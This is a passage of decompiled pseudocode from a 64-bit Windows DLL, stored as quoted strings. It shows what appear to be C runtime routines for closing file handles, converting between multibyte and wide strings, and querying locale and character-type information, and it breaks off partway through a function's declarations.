    "  char v12; // [rsp+58h] [rbp-8h]",
    "",
    "  v5[0] = 0;",
    "  v6 = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v8 = 1;",
    "    v7 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v1 = sub_18002A6D8(a1, v5);",
    "  if ( v8 == 2 )",
    "    *(_DWORD *)(v5[0] + 936LL) &= ~2u;",
    "  if ( v10 )",
    "  {",
    "    v2 = v9;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v5) + 32) = v2;",
    "  }",
    "  if ( v12 )",
    "  {",
    "    v3 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v5) + 36) = v3;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002A6D8(unsigned int a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdi",
    "  DWORD LastError; // ebx",
    "  __int64 v5; // rbx",
    "  void *v6; // rax",
    "",
    "  v2 = (int)a1;",
    "  if ( sub_18002E4C8(a1) == -1",
    "    || ((_DWORD)v2 == 1 && (*(_BYTE *)(qword_18004D870[0] + 200) & 1) != 0",
    "     || (_DWORD)v2 == 2 && (*(_BYTE *)(qword_18004D870[0] + 128) & 1) != 0)",
    "    && (v5 = sub_18002E4C8(2), sub_18002E4C8(1) == v5)",
    "    || (v6 = (void *)sub_18002E4C8((unsigned int)v2), CloseHandle(v6)) )",
    "  {",
    "    LastError = 0;",
    "  }",
    "  else",
    "  {",
    "    LastError = GetLastError();",
    "  }",
    "  sub_18002E40C((unsigned int)v2);",
    "  *(_BYTE *)(qword_18004D870[v2 >> 6] + 72 * (v2 & 0x3F) + 56) = 0;",
    "  if ( !LastError )",
    "    return 0;",
    "  sub_18001A7C8(LastError, a2);",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_18002A7A8(_QWORD *a1)",
    "{",
    "  __int64 v2; // rax",
    "  char v4; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  *a1 = 0;",
    "  sub_1800209E8(8);",
    "  v2 = *(_QWORD *)sub_18002A81C(&v4);",
    "  *a1 = v2;",
    "  if ( v2 )",
    "  {",
    "    *(_DWORD *)(v2 + 16) = 0;",
    "    *(_QWORD *)(v2 + 40) = 0;",
    "    *(_QWORD *)v2 = 0;",
    "    *(_QWORD *)(v2 + 8) = 0;",
    "    *(_DWORD *)(v2 + 24) = -1;",
    "  }",
    "  sub_180020A3C(8);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002A800(__int64 a1)",
    "{",
    "  *(_DWORD *)(a1 + 24) = -1;",
    "  *(_QWORD *)a1 = 0;",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  *(_DWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 28) = 0;",
    "  *(_QWORD *)(a1 + 40) = 0;",
    "  return (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 20), 0);",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_18002A81C(_QWORD *a1)",
    "{",
    "  LPVOID *v2; // rdi",
    "  __int64 v3; // rbp",
    "  _DWORD *v4; // rbx",
    "  signed __int32 v5; // eax",
    "  signed __int32 v6; // ett",
    "",
    "  v2 = (LPVOID *)(*(_QWORD *)&qword_18004D2D8.ControlWord + 24LL);",
    "  v3 = *(_QWORD *)&qword_18004D2D8.ControlWord + 24LL + 8 * (dword_18004D2D0 - 3LL);",
    "  while ( v2 != (LPVOID *)v3 )",
    "  {",
    "    v4 = *v2;",
    "    if ( !*v2 )",
    "    {",
    "      *v2 = sub_1800232FC(1u, 0x58u);",
    "      sub_180023374(0);",
    "      if ( *v2 )",
    "      {",
    "        *((_DWORD *)*v2 + 6) = -1;",
    "        sub_180023878((LPCRITICAL_SECTION)((char *)*v2 + 48), (PCONTEXT)0xFA0, 0);",
    "        v4 = *v2;",
    "        _InterlockedOr((volatile signed __int32 *)*v2 + 5, 0x2000u);",
    "        sub_180017470(v4);",
    "LABEL_12:",
    "        *a1 = v4;",
    "        return a1;",
    "      }",
    "      break;",
    "    }",
    "    if ( (v4[5] & 0x2000) == 0 )",
    "    {",
    "      sub_180017470(*v2);",
    "      _m_prefetchw(v4 + 5);",
    "      v5 = v4[5];",
    "      do",
    "      {",
    "        v6 = v5;",
    "        v5 = _InterlockedCompareExchange(v4 + 5, v5 | 0x2000, v5);",
    "      }",
    "      while ( v6 != v5 );",
    "      if ( (v5 & 0x2000) == 0 )",
    "        goto LABEL_12;",
    "      sub_18001747C(v4);",
    "    }",
    "    ++v2;",
    "  }",
    "  *a1 = 0;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002A908(",
    "        unsigned __int64 *a1,",
    "        _WORD *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        unsigned __int64 a5,",
    "        __int64 a6)",
    "{",
    "  unsigned int v6; // ebx",
    "  unsigned int v10; // r12d",
    "  unsigned int v11; // esi",
    "  unsigned __int64 v13; // r8",
    "  __int64 v14; // rax",
    "  unsigned __int64 v15; // rax",
    "",
    "  v6 = 0;",
    "  v10 = 0;",
    "  if ( a2 )",
    "  {",
    "    if ( !a3 )",
    "    {",
    "LABEL_5:",
    "      v11 = 22;",
    "      *(_BYTE *)(a6 + 48) = 1;",
    "      *(_DWORD *)(a6 + 44) = 22;",
    "      sub_18001A598(0, 0, 0, 0, 0, a6);",
    "      return v11;",
    "    }",
    "    *a2 = 0;",
    "  }",
    "  else if ( a3 )",
    "  {",
    "    goto LABEL_5;",
    "  }",
    "  if ( a1 )",
    "    *a1 = 0;",
    "  v13 = a5;",
    "  if ( a5 > a3 )",
    "    v13 = a3;",
    "  if ( v13 > 0x7FFFFFFF )",
    "  {",
    "    v11 = 22;",
    "LABEL_24:",
    "    *(_DWORD *)(a6 + 44) = v11;",
    "    *(_BYTE *)(a6 + 48) = 1;",
    "    sub_18001A598(0, 0, 0, 0, 0, a6);",
    "    return v11;",
    "  }",
    "  v14 = sub_18002AA28(a2, a4, v13, a6);",
    "  if ( v14 == -1 )",
    "  {",
    "    if ( a2 )",
    "      *a2 = 0;",
    "    if ( *(_BYTE *)(a6 + 48) )",
    "      return *(unsigned int *)(a6 + 44);",
    "    return v6;",
    "  }",
    "  else",
    "  {",
    "    v15 = v14 + 1;",
    "    if ( a2 )",
    "    {",
    "      if ( v15 > a3 )",
    "      {",
    "        if ( a5 != -1 )",
    "        {",
    "          *a2 = 0;",
    "          v11 = 34;",
    "          goto LABEL_24;",
    "        }",
    "        v15 = a3;",
    "        v10 = 80;",
    "      }",
    "      a2[v15 - 1] = 0;",
    "    }",
    "    if ( a1 )",
    "      *a1 = v15;",
    "    return v10;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002AA28(_WORD *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4)",
    "{",
    "  _WORD *v6; // rsi",
    "  unsigned __int64 v7; // rdi",
    "  __int64 result; // rax",
    "  __int64 v9; // rax",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rax",
    "  __int64 v12; // rax",
    "  int v13; // r9d",
    "  _BYTE *v14; // r8",
    "  bool i; // zf",
    "  __int64 v16; // [rsp+60h] [rbp+8h] BYREF",
    "  _BYTE *v17; // [rsp+68h] [rbp+10h] BYREF",
    "",
    "  v17 = a2;",
    "  v6 = a1;",
    "  v7 = 0;",
    "  if ( a1 )",
    "  {",
    "    if ( !a3 )",
    "      return 0;",
    "    *a1 = 0;",
    "  }",
    "  if ( !a2 )",
    "  {",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a4);",
    "    return -1;",
    "  }",
    "  if ( !*(_BYTE *)(a4 + 40) )",
    "  {",
    "    sub_180019E10(a4);",
    "    a2 = v17;",
    "  }",
    "  v9 = *(_QWORD *)(a4 + 24);",
    "  v10 = *(unsigned int *)(v9 + 12);",
    "  if ( (_DWORD)v10 == 65001 )",
    "  {",
    "    v16 = 0;",
    "    return sub_18002FF04((_DWORD)v6, (unsigned int)&v17, a3, (unsigned int)&v16, a4);",
    "  }",
    "  v11 = *(_QWORD *)(v9 + 312);",
    "  if ( !v6 )",
    "  {",
    "    v7 = -1;",
    "    if ( !v11 )",
    "    {",
    "      do",
    "        ++v7;",
    "      while ( a2[v7] );",
    "      return v7;",
    "    }",
    "    v12 = (int)sub_18002C1D0(v10, 9, a2);",
    "    if ( !(_DWORD)v12 )",
    "    {",
    "      *(_BYTE *)(a4 + 48) = 1;",
    "      *(_DWORD *)(a4 + 44) = 42;",
    "      return v7;",
    "    }",
    "    return v12 - 1;",
    "  }",
    "  if ( !v11 )",
    "  {",
    "    if ( a3 )",
    "    {",
    "      do",
    "      {",
    "        *v6 = (unsigned __int8)a2[v7];",
    "        if ( !a2[v7] )",
    "          break;",
    "        ++v7;",
    "        ++v6;",
    "      }",
    "      while ( v7 < a3 );",
    "    }",
    "    return v7;",
    "  }",
    "  v7 = -1;",
    "  v12 = (int)sub_18002C1D0(v10, 9, a2);",
    "  if ( (_DWORD)v12 )",
    "    return v12 - 1;",
    "  if ( GetLastError() != 122 )",
    "    goto LABEL_19;",
    "  v13 = a3;",
    "  v14 = v17;",
    "  for ( i = (_DWORD)a3 == 0; !i; i = v13 == 0 )",
    "  {",
    "    --v13;",
    "    if ( !*v14 )",
    "      break;",
    "    if ( *(__int16 *)(**(_QWORD **)(a4 + 24) + 2LL * (unsigned __int8)*v14) < 0 && !*++v14 )",
    "      goto LABEL_19;",
    "    ++v14;",
    "  }",
    "  result = (int)sub_18002C1D0(*(unsigned int *)(*(_QWORD *)(a4 + 24) + 12LL), 1, v17);",
    "  if ( !(_DWORD)result )",
    "  {",
    "LABEL_19:",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 42;",
    "    *v6 = 0;",
    "    return v7;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002AC24(unsigned __int64 *a1, _WORD *a2, unsigned __int64 a3, __int64 a4, unsigned __int64 a5)",
    "{",
    "  unsigned int v5; // edi",
    "  int v6; // ebx",
    "  int v7; // ebx",
    "  _QWORD v9[2]; // [rsp+30h] [rbp-40h] BYREF",
    "  char v10; // [rsp+40h] [rbp-30h]",
    "  __int128 v11; // [rsp+48h] [rbp-28h]",
    "  char v12; // [rsp+58h] [rbp-18h]",
    "  int v13; // [rsp+5Ch] [rbp-14h]",
    "  char v14; // [rsp+60h] [rbp-10h]",
    "  int v15; // [rsp+64h] [rbp-Ch]",
    "  char v16; // [rsp+68h] [rbp-8h]",
    "",
    "  v9[0] = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  v16 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v12 = 1;",
    "    v11 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v5 = sub_18002A908(a1, a2, a3, a4, a5, (__int64)v9);",
    "  if ( v12 == 2 )",
    "    *(_DWORD *)(v9[0] + 936LL) &= ~2u;",
    "  if ( v14 )",
    "  {",
    "    v6 = v13;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v9) + 32) = v6;",
    "  }",
    "  if ( v16 )",
    "  {",
    "    v7 = v15;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v9) + 36) = v7;",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002ACCC(",
    "        unsigned __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        unsigned __int64 a5,",
    "        __int64 a6)",
    "{",
    "  unsigned int v6; // ebx",
    "  unsigned int v10; // r12d",
    "  unsigned __int64 v11; // r8",
    "  unsigned int v12; // esi",
    "  __int64 v14; // rax",
    "  unsigned __int64 v15; // rax",
    "",
    "  v6 = 0;",
    "  v10 = 0;",
    "  if ( a2 )",
    "  {",
    "    if ( a3 )",
    "    {",
    "      *a2 = 0;",
    "      goto LABEL_4;",
    "    }",
    "LABEL_11:",
    "    v12 = 22;",
    "    *(_BYTE *)(a6 + 48) = 1;",
    "    *(_DWORD *)(a6 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a6);",
    "    return v12;",
    "  }",
    "  if ( a3 )",
    "    goto LABEL_11;",
    "LABEL_4:",
    "  if ( a1 )",
    "    *a1 = 0;",
    "  v11 = a5;",
    "  if ( a5 > a3 )",
    "    v11 = a3;",
    "  if ( v11 > 0x7FFFFFFF )",
    "  {",
    "    v12 = 22;",
    "LABEL_23:",
    "    *(_DWORD *)(a6 + 44) = v12;",
    "    *(_BYTE *)(a6 + 48) = 1;",
    "    sub_18001A598(0, 0, 0, 0, 0, a6);",
    "    return v12;",
    "  }",
    "  v14 = sub_18002ADE0(a2, a4, v11, a6);",
    "  if ( v14 == -1 )",
    "  {",
    "    if ( a2 )",
    "      *a2 = 0;",
    "    if ( *(_BYTE *)(a6 + 48) )",
    "      return *(unsigned int *)(a6 + 44);",
    "    return v6;",
    "  }",
    "  else",
    "  {",
    "    v15 = v14 + 1;",
    "    if ( a2 )",
    "    {",
    "      if ( v15 > a3 )",
    "      {",
    "        if ( a5 != -1 )",
    "        {",
    "          *a2 = 0;",
    "          v12 = 34;",
    "          goto LABEL_23;",
    "        }",
    "        v15 = a3;",
    "        v10 = 80;",
    "      }",
    "      a2[v15 - 1] = 0;",
    "    }",
    "    if ( a1 )",
    "      *a1 = v15;",
    "    return v10;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002ADE0(__int64 a1, __int16 *a2, unsigned __int64 a3, __int64 a4)",
    "{",
    "  unsigned __int64 v5; // rsi",
    "  __int64 v7; // rdi",
    "  __int64 result; // rax",
    "  __int64 v9; // rax",
    "  int v10; // r10d",
    "  __int64 v11; // rcx",
    "  __int16 v12; // ax",
    "  __int16 *v13; // rax",
    "  unsigned __int64 v14; // rcx",
    "  int v15; // eax",
    "  __int64 v16; // rcx",
    "  int v17; // eax",
    "  unsigned __int64 v18; // r14",
    "  int v19; // edx",
    "  __int64 v20; // rcx",
    "  int v21; // eax",
    "  int v22; // ecx",
    "  int v23; // eax",
    "  __int64 v24; // rdx",
    "  __int64 v25; // rcx",
    "  char v26; // al",
    "  unsigned __int16 v27; // ax",
    "  __int64 v28; // rcx",
    "  int v29; // eax",
    "  int v30; // [rsp+40h] [rbp-38h] BYREF",
    "  __int16 *v31; // [rsp+48h] [rbp-30h] BYREF",
    "  __int64 v32; // [rsp+50h] [rbp-28h] BYREF",
    "  _BYTE v33[8]; // [rsp+58h] [rbp-20h] BYREF",
    "",
    "  v31 = a2;",
    "  v30 = 0;",
    "  v5 = a3;",
    "  v7 = 0;",
    "  if ( a1 && !a3 )",
    "    return 0;",
    "  if ( !a2 )",
    "  {",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a4);",
    "    return -1;",
    "  }",
    "  if ( !*(_BYTE *)(a4 + 40) )",
    "  {",
    "    sub_180019E10(a4);",
    "    a2 = v31;",
    "  }",
    "  v9 = *(_QWORD *)(a4 + 24);",
    "  v10 = *(_DWORD *)(v9 + 12);",
    "  if ( v10 == 65001 )",
    "  {",
    "    v32 = 0;",
    "    return sub_180032A1C(a1, (unsigned int)&v31, v5, (unsigned int)&v32, a4);",
    "  }",
    "  v11 = *(_QWORD *)(v9 + 312);",
    "  if ( !a1 )",
    "  {",
    "    if ( !v11 )",
    "    {",
    "      v27 = *a2;",
    "      v28 = 0;",
    "      if ( *a2 )",
    "      {",
    "        while ( v27 <= 0xFFu )",
    "        {",
    "          ++a2;",
    "          ++v28;",
    "          v27 = *a2;",
    "          if ( !*a2 )",
    "            return v28;",
    "        }",
    "        goto LABEL_18;",
    "      }",
    "      return v28;",
    "    }",
    "    v7 = -1;",
    "    v29 = sub_18002C260(v10, 0, (_DWORD)a2, -1, 0, 0, 0, (__int64)&v30);",
    "    if ( v29 && !v30 )",
    "      return v29 - 1LL;",
    "    goto LABEL_57;",
    "  }",
    "  if ( !v11 )",
    "  {",
    "    if ( v5 )",
    "    {",
    "      while ( (unsigned __int16)*a2 <= 0xFFu )",
    "      {",
    "        *(_BYTE *)(a1 + v7) = *(_BYTE *)a2;",
    "        v12 = *a2++;",
    "        v31 = a2;",
    "        if ( v12 )",
    "        {",
    "          if ( ++v7 < v5 )",
    "            continue;",
    "        }",
    "        return v7;",
    "      }",
    "LABEL_18:",
    "      *(_BYTE *)(a4 + 48) = 1;",
    "      *(_DWORD *)(a4 + 44) = 42;",
    "      return -1;",
    "    }",
    "    return v7;",
    "  }",
    "  if ( *(_DWORD *)(v9 + 8) != 1 )",
    "  {",
    "    v7 = -1;",
    "    v17 = sub_18002C260(v10, 0, (_DWORD)a2, -1, a1, v5, 0, (__int64)&v30);",
    "    v18 = v17;",
    "    if ( !v30 )",
    "    {",
    "      if ( v17 )",
    "        return v17 - 1LL;",
    "      if ( GetLastError() == 122 )",
    "      {",
    "        if ( !v5 )",
    "          return v18;",
    "        v19 = (int)v31;",
    "LABEL_37:",
    "        v20 = *(_QWORD *)(a4 + 24);",
    "        v21 = *(_DWORD *)(v20 + 8);",
    "        v22 = *(_DWORD *)(v20 + 12);",
    "        if ( v21 > 5 )",
    "          v21 = 5;",
    "        v23 = sub_18002C260(v22, 0, v19, 1, (unsigned int)v33, v21, 0, (__int64)&v30);",
    "        if ( v23 )",
    "        {",
    "          if ( !v30 && v23 >= 0 )",
    "          {",
    "            v24 = v23;",
    "            if ( (unsigned __int64)v23 <= 5 )",
    "            {",
    "              if ( v23 + v18 <= v5 )",
    "              {",
    "                v25 = 0;",
    "                while ( 1 )",
    "                {",
    "                  v26 = v33[v25];",
    "                  *(_BYTE *)(a1 + v18) = v26;",
    "                  if ( !v26 )",
    "                    break;",
    "                  ++v25;",
    "                  ++v18;",
    "                  if ( v25 >= v24 )",
    "                  {",
    "                    v19 = (_DWORD)v31++ + 2;",
    "                    if ( v18 < v5 )",
    "                      goto LABEL_37;",
    "                    return v18;",
    "                  }",
    "                }",
    "              }",
    "              return v18;",
    "            }",
    "          }",
    "        }",
    "      }",
    "    }",
    "LABEL_57:",
    "    *(_DWORD *)(a4 + 44) = 42;",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    return v7;",
    "  }",
    "  if ( v5 )",
    "  {",
    "    v13 = a2;",
    "    v14 = v5;",
    "    while ( *v13 )",
    "    {",
    "      ++v13;",
    "      if ( !--v14 )",
    "        goto LABEL_26;",
    "    }",
    "    LODWORD(v5) = v13 - a2 + 1;",
    "  }",
    "LABEL_26:",
    "  v15 = sub_18002C260(v10, 0, (_DWORD)a2, v5, a1, v5, 0, (__int64)&v30);",
    "  v16 = v15;",
    "  if ( !v15 || v30 )",
    "    goto LABEL_18;",
    "  result = v15 - 1LL;",
    "  if ( *(_BYTE *)(a1 + v16 - 1) )",
    "    return v16;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002B120(",
    "        unsigned __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        unsigned __int64 a5,",
    "        __int128 *a6)",
    "{",
    "  __int128 v6; // xmm0",
    "  unsigned int v7; // edi",
    "  int v8; // ebx",
    "  int v9; // ebx",
    "  _QWORD v11[2]; // [rsp+30h] [rbp-40h] BYREF",
    "  char v12; // [rsp+40h] [rbp-30h]",
    "  __int128 v13; // [rsp+48h] [rbp-28h]",
    "  char v14; // [rsp+58h] [rbp-18h]",
    "  int v15; // [rsp+5Ch] [rbp-14h]",
    "  char v16; // [rsp+60h] [rbp-10h]",
    "  int v17; // [rsp+64h] [rbp-Ch]",
    "  char v18; // [rsp+68h] [rbp-8h]",
    "",
    "  v11[0] = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  v16 = 0;",
    "  v18 = 0;",
    "  if ( a6 )",
    "  {",
    "    v6 = *a6;",
    "  }",
    "  else",
    "  {",
    "    if ( dword_18004DC98 )",
    "      goto LABEL_6;",
    "    v6 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v14 = 1;",
    "  v13 = v6;",
    "LABEL_6:",
    "  v7 = sub_18002ACCC(a1, a2, a3, a4, a5, (__int64)v11);",
    "  if ( v14 == 2 )",
    "    *(_DWORD *)(v11[0] + 936LL) &= ~2u;",
    "  if ( v16 )",
    "  {",
    "    v8 = v15;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v11) + 32) = v8;",
    "  }",
    "  if ( v18 )",
    "  {",
    "    v9 = v17;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v11) + 36) = v9;",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002B1D8(__int128 *a1, __int64 a2, LCTYPE a3, int a4, int a5)",
    "{",
    "  int v8; // r12d",
    "  int v9; // eax",
    "  unsigned int v10; // edi",
    "  unsigned int v11; // edi",
    "  unsigned __int64 v12; // rcx",
    "  unsigned __int64 v13; // rdx",
    "  __int64 v14; // rax",
    "  void *v15; // rsp",
    "  WCHAR *v16; // rbx",
    "  WCHAR *v17; // rax",
    "  __int64 v19; // [rsp+0h] [rbp-40h] BYREF",
    "  int v20; // [rsp+40h] [rbp+0h] BYREF",
    "  _QWORD v21[3]; // [rsp+48h] [rbp+8h] BYREF",
    "  char v22; // [rsp+60h] [rbp+20h]",
    "",
    "  sub_18001B674(v21, a1);",
    "  v8 = *(_DWORD *)(v21[1] + 12LL);",
    "  v9 = sub_18002377C(a2, a3, 0, 0);",
    "  v10 = v9;",
    "  if ( !v9 )",
    "  {",
    "    v11 = 0;",
    "    goto LABEL_19;",
    "  }",
    "  v12 = 2LL * v9 + 16;",
    "  v13 = v12 & -(__int64)(2LL * v9 < v12);",
    "  if ( !v13 )",
    "  {",
    "    v16 = 0;",
    "    goto LABEL_16;",
    "  }",
    "  if ( v13 <= 0x400 )",
    "  {",
    "    v14 = v13 + 15;",
    "    if ( v13 + 15 < v13 )",
    "      v14 = 0xFFFFFFFFFFFFFF0LL;",
    "    v15 = alloca(v14 & 0xFFFFFFFFFFFFFFF0uLL);",
    "    v16 = (WCHAR *)&v20;",
    "    if ( &v19 == (__int64 *)-64LL )",
    "    {",
    "LABEL_16:",
    "      v11 = 0;",
    "      if ( !v16 )",
    "        goto LABEL_19;",
    "      goto LABEL_17;",
    "    }",
    "    v20 = 52428;",
    "    goto LABEL_11;",
    "  }",
    "  v17 = (WCHAR *)sub_180024B50(v12 & -(__int64)(2LL * v9 < v12));",
    "  v16 = v17;",
    "  if ( v17 )",
    "  {",
    "    *(_DWORD *)v17 = 56797;",
    "LABEL_11:",
    "    v16 += 8;",
    "  }",
    "  if ( !v16 || !sub_18002377C(a2, a3, v16, v10) )",
    "    goto LABEL_16;",
    "  v11 = sub_18002C260(v8, 0, (_DWORD)v16, -1, a4 & (unsigned int)-(a5 != 0), a5, 0, 0);",
    "LABEL_17:",
    "  if ( *((_DWORD *)v16 - 4) == 56797 )",
    "    sub_180023374((XSAVE_FORMAT *)(v16 - 8));",
    "LABEL_19:",
    "  if ( v22 )",
    "    *(_DWORD *)(v21[0] + 936LL) &= ~2u;",
    "  return v11;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002B354(__int128 *a1, int a2, __int64 a3, LCTYPE a4, LPVOID *a5)",
    "{",
    "  unsigned int v5; // edi",
    "  int v9; // eax",
    "  __int64 v10; // rbx",
    "  int v12; // eax",
    "  int v13; // r15d",
    "  XSAVE_FORMAT *v14; // rax",
    "  XSAVE_FORMAT *v15; // rbx",
    "  int v16; // eax",
    "  XSAVE_FORMAT *v17; // rax",
    "  int v18; // eax",
    "  unsigned int v19; // r15d",
    "  WCHAR *v20; // rax",
    "  WCHAR v21[8]; // [rsp+30h] [rbp-D8h] BYREF",
    "  _BYTE v22[128]; // [rsp+40h] [rbp-C8h] BYREF",
    "",
    "  v5 = 0;",
    "  *a5 = 0;",
    "  if ( a2 == 1 )",
    "  {",
    "    v9 = sub_18002B1D8(a1, a3, a4, (int)v22, 128);",
    "    v10 = v9;",
    "    if ( v9 )",
    "    {",
    "      *a5 = sub_1800232FC(v9, 1u);",
    "      sub_180023374(0);",
    "      if ( *a5 )",
    "      {",
    "        if ( (unsigned int)sub_180032B70(*a5, v10, v22, (int)v10 - 1) )",
    "        {",
    "          sub_18001A6B4();",
    "          __debugbreak();",
    "        }",
    "        return 0;",
    "      }",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "    if ( GetLastError() == 122 )",
    "    {",
    "      v12 = sub_18002B1D8(a1, a3, a4, 0, 0);",
    "      v13 = v12;",
    "      if ( v12 )",
    "      {",
    "        v14 = (XSAVE_FORMAT *)sub_1800232FC(v12, 1u);",
    "        v15 = v14;",
    "        if ( !v14 )",
    "          goto LABEL_12;",
    "        v16 = sub_18002B1D8(a1, a3, a4, (int)v14, v13);",
    "LABEL_10:",
    "        if ( v16 )",
    "        {",
    "          v17 = v15;",
    "          v15 = 0;",
    "          *a5 = v17;",
    "LABEL_13:",
    "          sub_180023374(v15);",
    "          return v5;",
    "        }",
    "LABEL_12:",
    "        v5 = -1;",
    "        goto LABEL_13;",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( a2 != 2 )",
    "    {",
    "      if ( !a2 )",
    "      {",
    "        *(_DWORD *)v21 = 0;",
    "        if ( sub_18002377C(a3, a4 | 0x20000000, v21, 2u) )",
    "        {",
    "          *(_BYTE *)a5 = v21[0];",
    "          return 0;",
    "        }",
    "      }",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "    v18 = sub_18002377C(a3, a4, 0, 0);",
    "    v19 = v18;",
    "    if ( v18 )",
    "    {",
    "      v20 = (WCHAR *)sub_1800232FC(v18, 2u);",
    "      v15 = (XSAVE_FORMAT *)v20;",
    "      if ( !v20 )",
    "        goto LABEL_12;",
    "      v16 = sub_18002377C(a3, a4, v20, v19);",
    "      goto LABEL_10;",
    "    }",
    "  }",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002B51C(",
    "        __int128 *a1,",
    "        DWORD a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        WORD *lpCharType,",
    "        unsigned int a6,",
    "        int a7)",
    "{",
    "  unsigned int v9; // edi",
    "  int v10; // eax",
    "  __int64 v11; // r14",
    "  unsigned int StringTypeW; // edi",
    "  unsigned __int64 v13; // rcx",
    "  __int64 v14; // rax",
    "  void *v15; // rsp",
    "  const WCHAR *v16; // rbx",
    "  WCHAR *v17; // rax",
    "  int v18; // eax",
    "  __int64 v20; // [rsp+0h] [rbp-30h] BYREF",
    "  const WCHAR *v21; // [rsp+20h] [rbp-10h]",
    "  int v22; // [rsp+28h] [rbp-8h]",
    "  int v23; // [rsp+30h] [rbp+0h] BYREF",
    "  _QWORD v24[3]; // [rsp+38h] [rbp+8h] BYREF",
    "  char v25; // [rsp+50h] [rbp+20h]",
    "",
    "  sub_18001B674(v24, a1);",
    "  v9 = a6;",
    "  if ( !a6 )",
    "    v9 = *(_DWORD *)(v24[1] + 12LL);",
    "  v22 = 0;",
    "  v21 = 0;",
    "  v10 = sub_18002C1D0(v9, a7 != 0 ? 9 : 1, a3);",
    "  v11 = v10;",
    "  if ( !v10 )",
    "  {",
    "    StringTypeW = 0;",
    "    goto LABEL_21;",
    "  }",
    "  v13 = (2LL * v10 + 16) & -(__int64)(2LL * v10 < (unsigned __int64)(2LL * v10 + 16));",
    "  if ( !v13 )",
    "  {",
    "    v16 = 0;",
    "    goto LABEL_18;",
    "  }",
    "  if ( v13 <= 0x400 )",
    "  {",
    "    v14 = v13 + 15;",
    "    if ( v13 + 15 < v13 )",
    "      v14 = 0xFFFFFFFFFFFFFF0LL;",
    "    v15 = alloca(v14 & 0xFFFFFFFFFFFFFFF0uLL);",
    "    v16 = (const WCHAR *)&v23;",
    "    if ( &v20 == (__int64 *)-48LL )",
    "    {",
    "LABEL_18:",
    "      StringTypeW = 0;",
    "      if ( !v16 )",
    "        goto LABEL_21;",
    "      goto LABEL_19;",
    "    }",
    "    v23 = 52428;",
    "    goto LABEL_13;",
    "  }",
    "  v17 = (WCHAR *)sub_180024B50(v13);",
    "  v16 = v17;",
    "  if ( v17 )",
    "  {",
    "    *(_DWORD *)v17 = 56797;",
    "LABEL_13:",
    "    v16 += 8;",
    "  }",
    "  if ( !v16 )",
    "    goto LABEL_18;",
    "  sub_1800368A0(v16, 0, 2 * v11);",
    "  v22 = v11;",
    "  v21 = v16;",
    "  v18 = sub_18002C1D0(v9, 1, a3);",
    "  if ( !v18 )",
    "    goto LABEL_18;",
    "  StringTypeW = GetStringTypeW(a2, v16, v18, lpCharType);",
    "LABEL_19:",
    "  if ( *((_DWORD *)v16 - 4) == 56797 )",
    "    sub_180023374((XSAVE_FORMAT *)(v16 - 8));",
    "LABEL_21:",
    "  if ( v25 )",
    "    *(_DWORD *)(v24[0] + 936LL) &= ~2u;",
    "  return StringTypeW;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002B6AC(",
    "        __int64 a1,",
    "        __int64 a2,",
    "        DWORD a3,",
    "        _BYTE *a4,",
    "        int a5,",
    "        WCHAR *a6,",
    "        int a7,",
    "        unsigned int a8,",
    "        int a9)",
    "{",
    "  unsigned int v13; // r14d",
    "  __int64 result; // rax",
    "  __int64 v15; // r15",
    "  unsigned __int64 v16; // rcx",
    "  unsigned __int64 v17; // rax",
    "  __int64 v18; // rcx",
    "  unsigned __int64 v19; // rcx",
